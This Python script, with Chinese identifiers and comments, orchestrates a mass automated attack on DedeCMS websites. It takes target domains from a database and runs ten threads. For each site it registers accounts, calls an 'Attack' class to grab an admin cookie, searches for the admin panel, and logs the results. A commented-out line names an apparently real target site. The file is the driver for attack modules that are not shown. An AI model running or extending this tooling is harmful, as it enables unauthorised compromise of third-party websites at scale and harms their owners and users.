# coding:utf-8

from unit import dbsqlite
import requests
from common import utils
from auto_dede import 批量注册
from auto_dede import 找空间
from auto_dede import 找后台
import threading
from threading import Thread


R = threading.Lock()
target_domains = []


def get_domains():
    try:
        R.acquire()
        if len(target_domains) < 20 :
            print("取数据")
            domains = dbsqlite.start_getlist(' status = 0 limit 100')
            target_domains.extend(domains)
        R.release()
    except Exception as e:
        R.release()
        R.release()


# 二、注册  status： 2：成功 3：失败
# 三、找空间 status： 4：存在  5：不存在
# 四、查找后台地址  status： 6：已找到 7：未找到
def start(i):
    while True:
        status = 0
        des = ''
        try:
            domain_model = target_domains.pop(0)
        except Exception as e:
            print('线程：%d,未查到符合条件数据,等待...' % i)
            get_domains()
            continue
        url = domain_model[1]
        reg_result = 批量注册.注册(url,num=0)
        if reg_result['res']:
            print(url + '--------注册成功，准备找空间')
            status = 2
            des = reg_result['info']
            atk = 找空间.Attack(domain=url, back_ground_url="", user=reg_result['info'], pwd="qwe123")
            home_result = atk.get_admin_cookie()
            if home_result['res']:
                print(url+'---------找到空间，准备找后台')
                status = 4
                des = home_result['info']
                mange_result = 找后台.get_manger_url(url)
                if mange_result['res']:
                    status = 6
                    des = mange_result['info']
                else:
                    status = 7
                    print("模式1未找到后台地址：%s" % url)
                    des = mange_result['info']
            else:
                status = 5
                des = home_result['info']
        else:
            status = 3
            des = reg_result['info']
        # insert db
        print("%s----%s" % (des, domain_model[1]))
        dbsqlite.data_update(domain_model[1], "status = %d,des = '%s'" % (status, des))


if __name__ == '__main__':
    # target_domains.append([1,"http://www.heb315.com","1"])
    # start(1)
    try:
        Threads = []
        for i in range(10):
            t = Thread(target=start, args=(i,))
            t.daemon = 1
            Threads.append(t)
            t.start()
        # 启动所有线程
        for i in Threads:
            i.join()
    except Exception as e:
        print(e)
